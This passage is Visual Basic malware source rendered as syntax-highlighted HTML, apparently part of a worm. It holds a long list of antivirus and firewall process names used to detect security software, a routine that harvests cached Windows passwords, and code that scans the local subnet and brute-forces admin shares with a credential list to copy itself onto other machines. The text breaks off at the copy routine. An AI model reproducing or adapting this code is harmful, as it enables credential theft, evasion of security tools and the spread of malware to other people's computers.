</span><span class="sc4">"monitor"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcmnhdlr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"mctool"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcupdate"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcvsrte"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mghtml"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"minilog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcvsshld"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mpfservice"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mwatch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcshield"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mfw2en"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mfweng3"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mgavr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mgui"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"monsys"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"monwow"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mrflux"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"msinfo32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mssmmc32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mu0311ad"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mxtask"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netd32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nod32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"nspclean"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nmain"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvc95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nisum"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nupgrade"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nwtool16"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"normist"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nisserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nsched32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"neowatchlog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvsvc32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nwservice"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ntxconfig"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ntvdm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"npssvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"npscheck"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netutils"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ndd32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"notstart"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nc2000"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ncinst4"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netarmor"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netinfo"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"netmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netspyhunter"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netstat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"norton"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"npf"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nui"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvarch16"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvlaunch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nwinst4"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvapsvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"outpost"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"offguard"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ostronet"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"procexp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcfwallicon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"programauditor"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pop3trap"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"poproxy"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcntmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"padmin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pview95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"per"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pqremove"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pfwcon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pfwagent"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pfwsvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"prebind"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"panixk"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcdsetup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcip10117_0"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pf2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pfwadmin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"platin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"portdetective"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ppinupdt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pptbc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ppvstop"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"procexplorerv1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"proport"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"protect"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"purge"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"pccntmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ping"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"qconsole"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"qserver"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rescue"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rapapp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rtvscn95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rulaunch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regedit"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regedt32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"realmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rshell"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"stinger"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"serv95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"scan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"safeweb"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"symproxysvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"symtray"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sphinx"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"smc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"spyxx"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ss3edit"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sbserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"swnetsup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sfc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"schedapp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"setupvameeval"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"setup_flowprotector_us"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sgssfw32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"shellspyinstall"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"shn"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sofi"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"spf"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"srwatch"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"st2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"supftrl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"supporter5"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sweep"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sysdoc32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sysedit"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"sharedaccess"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tbscan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tds"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"taumon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tcm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tfak"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"th"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"taskmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tauscan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tgbob"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"titanin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tracer"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"trjs"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"trojan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"troyan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tmntsrv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"undoboot"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Update"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vshwin32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vet"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsecomr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbcmserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbcons"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vir -help"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"vptray"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsmain"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsstat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vettray"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vcontrol"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbust"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbwin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"virus"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vccmserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vcsetup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vfsetup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vnlan300"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vnpc3000"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vpc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vpfw30s"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vscenu6"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsisetup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vswin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vvstat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"view"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wfindv32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wimmun32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wgfe95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"webtrap"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"watchdog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wradmin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wrctrl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"w32dsm89"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"whoswatchingme"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"winrecon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"winroute"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"winsfcm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wsbgate"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zonealarm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zapro"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zap"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zcap"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zatutor"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zonestub"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zlclient"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zauinst"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zonalm2601"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"taskmgr"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">kavscan</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">

 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">StrExe</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">kavscan</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">KAV</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">KAV</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">GetPass</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
  </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">WNetEnumCachedPasswords</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc2">&amp;HFF</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">AddressOf</span><span class="sc0"> </span><span class="sc7">GetListPass</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetListPass</span><span class="sc6">(</span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">PASWORD_TYPE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">l&amp;</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">ret.Quelle</span><span class="sc0">
      </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ret.Feld</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc7">ret.Feld</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">))</span><span class="sc0">
      </span><span class="sc3">Else</span><span class="sc0">
        </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0">
      </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ret.Quelle</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ret.Quelle</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">ret.Pasword</span><span class="sc6">)</span><span class="sc0">
      </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ret.Feld</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc7">ret.Feld</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">))</span><span class="sc0">
      </span><span class="sc3">Else</span><span class="sc0">
        </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0">
      </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">

    </span><span class="sc7">StrPass</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrPass</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" U: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Username</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" P: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
    </span><span class="sc7">GetListPass</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">CalcSbIp</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">ip</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">pip</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">ip</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStrRev</span><span class="sc6">(</span><span class="sc7">ip</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">c1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
   </span><span class="sc7">ConecIP</span><span class="sc0"> </span><span class="sc7">pip</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">c1</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ConecIP</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sip</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">NTR</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">NETRESOURCE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dL</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc7">dL</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GLD</span><span class="sc0">

</span><span class="sc7">NTR.dwType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RESOURCETYPE_DISK</span><span class="sc0">
</span><span class="sc7">NTR.lpLocalName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">dL</span><span class="sc0">
</span><span class="sc7">NTR.lpRemoteName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"\\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">sip</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\C"</span><span class="sc0">
</span><span class="sc7">NTR.lpProvider</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">c1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Cred</span><span class="sc6">()</span><span class="sc0">
  </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">c2</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Cred</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WNetAddConnection2</span><span class="sc6">(</span><span class="sc7">NTR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">CStr</span><span class="sc6">(</span><span class="sc7">c1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc3">CStr</span><span class="sc6">(</span><span class="sc7">c2</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">CONNECT_UPDATE_PROFILE</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">CopyRed</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">dL</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">

  </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DeConecIp</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cL</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WNetCancelConnection2</span><span class="sc6">(</span><span class="sc7">cL</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">CopyRed</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
